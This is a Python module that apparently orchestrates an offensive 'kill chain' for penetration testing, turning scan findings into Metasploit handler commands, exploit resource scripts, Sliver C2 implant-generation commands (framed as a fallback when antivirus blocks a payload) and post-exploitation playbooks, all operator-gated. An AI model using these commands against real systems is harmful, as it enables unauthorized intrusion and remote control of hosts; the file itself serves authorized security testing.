"""kill_chain.py — Kill Chain Engine orchestrator.

Ties together all four phases:
  Phase 1: Listener management  (listener_mgr.py)
  Phase 2: Payload weaponization (weaponizer.py)
  Phase 3: Session interception  (session_interceptor.py)
  Phase 4: Sliver C2 alternative (sliver.py)

Flow:
  1. scan finds vuln → weaponizer builds exploit plan
  2. operator starts listener (msf handler or sliver)
  3. operator fires weaponized payload from web terminal
  4. session caught → interceptor provides post-exploitation playbook
  5. evidence plan generated for engagement report

Nothing auto-executes. Every step is operator-gated.
"""
from __future__ import annotations

import logging
from typing import Any, Dict, List, Optional

from .weaponizer import (
    weaponize,
    pick_exploit,
    pick_payload,
    detect_os,
    build_resource_script,
)
from .session_interceptor import (
    build_interceptor_script,
    build_evidence_plan,
    get_playbook,
    extract_session_id,
)

logger = logging.getLogger("AttackSurface.KillChain")


def kill_chain_from_finding(
    finding: Dict[str, Any],
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> Dict[str, Any]:
    """Generate a full kill chain plan from a single scan finding.

    Returns a dict with all four phases populated:
      - weaponization: payload, exploit, resource script
      - listener: what listener to start, with what options
      - interceptor: post-exploitation playbook for the expected session
      - sliver: sliver implant plan (alternative to meterpreter)
      - terminal_commands: pre-fill commands for the web terminal
    """
    weapon = weaponize(finding, lhost=lhost, lport=lport)

    service = finding.get("service", finding.get("name", ""))
    rhost = finding.get("host", finding.get("target", ""))
    vuln = finding.get("vuln", finding.get("title", finding.get("detail", "")))

    # ── Listener plan ──────────────────────────────────────────
    listener_plan = {
        "type": "msf_handler",
        "payload": weapon.get("payload", ""),
        "lhost": lhost,
        "lport": lport,
        "command": (
            f"msfconsole -q -x 'use exploit/multi/handler; "
            f"set PAYLOAD {weapon.get('payload', '')}; "
            f"set LHOST {lhost}; set LPORT {lport}; "
            f"set ExitOnSession false; exploit -j -z'"
        ),
        "description": (
            f"Start Metasploit multi/handler for {weapon.get('payload', 'unknown')} "
            f"on {lhost}:{lport}"
        ),
    }

    # ── Sliver alternative ─────────────────────────────────────
    os_type = weapon.get("os_type", "unknown")
    sliver_format = "exe" if os_type == "windows" else "elf"
    sliver_implant = {
        "profile": "http",
        "lhost": lhost,
        "lport": lport + 1,  # offset to avoid conflict with msf
        "format": sliver_format,
        "os": os_type,
        "listener_command": (
            f"sliver-server operator --lhost {lhost} --lport {lport + 1} "
            f"--profile http --name as-{rhost.replace('.', '-')}"
        ),
        "implant_command": (
            f"sliver-server generate --os {os_type} --arch amd64 "
            f"--format {sliver_format} --lhost {lhost} --lport {lport + 1} "
            f"--save /tmp/as_implant_{rhost}.{sliver_format}"
        ),
        "description": (
            f"Sliver C2 implant for {os_type} target {rhost} — "
            f"alternative to Meterpreter if AV blocks the payload"
        ),
    }

    # ── Interceptor playbook ───────────────────────────────────
    expected_session_type = (
        "meterpreter" if "meterpreter" in weapon.get("payload", "")
        else "shell"
    )
    interceptor = {
        "session_type": expected_session_type,
        "playbook": get_playbook(expected_session_type),
        "script": build_interceptor_script("SESSION_ID", expected_session_type),
        "evidence_plan": build_evidence_plan(
            "SESSION_ID", expected_session_type, rhost, vuln
        ),
    }

    # ── Terminal commands (pre-fill, NOT auto-execute) ─────────
    terminal_commands = []
    if weapon.get("resource_script"):
        terminal_commands.append({
            "label": "1. Write weaponized RC file",
            "command": (
                f"cat > /tmp/weapon_{rhost}.rc << 'RCEOF'\n"
                f"{weapon['resource_script']}\nRCEOF"
            ),
        })
        terminal_commands.append({
            "label": "2. Start MSF handler",
            "command": listener_plan["command"],
        })
        terminal_commands.append({
            "label": "3. Fire exploit",
            "command": f"msfconsole -q -r /tmp/weapon_{rhost}.rc",
        })
        terminal_commands.append({
            "label": "4. Post-exploitation (after session)",
            "command": interceptor["script"],
        })
    else:
        terminal_commands.append({
            "label": "Review manually",
            "command": weapon.get("warning", "No exploit found"),
        })

    # ── Assemble kill chain ────────────────────────────────────
    return {
        "target": rhost,
        "service": service,
        "vuln": vuln,
        "os_type": os_type,
        "weaponization": weapon,
        "listener": listener_plan,
        "interceptor": interceptor,
        "sliver": sliver_implant,
        "terminal_commands": terminal_commands,
        "chain_summary": (
            f"Kill chain for {rhost}:{finding.get('port', '?')} — "
            f"{os_type} / {service} / {vuln or 'unknown vuln'}"
        ),
    }


def kill_chain_from_scan(
    findings: List[Dict[str, Any]],
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    max_targets: int = 5,
) -> Dict[str, Any]:
    """Generate kill chain plans for multiple findings from a scan.

    Returns a dict with per-target plans and a combined terminal script.
    """
    plans = []
    for f in findings[:max_targets]:
        plan = kill_chain_from_finding(f, lhost=lhost, lport=lport)
        plans.append(plan)

    combined_script = "\n\n".join(
        p["weaponization"]["resource_script"]
        for p in plans
        if p["weaponization"].get("resource_script")
    )

    return {
        "target_count": len(plans),
        "plans": plans,
        "combined_rc": combined_script,
        "summary": (
            f"Kill chain generated for {len(plans)} target(s). "
            f"Review each plan before firing."
        ),
    }
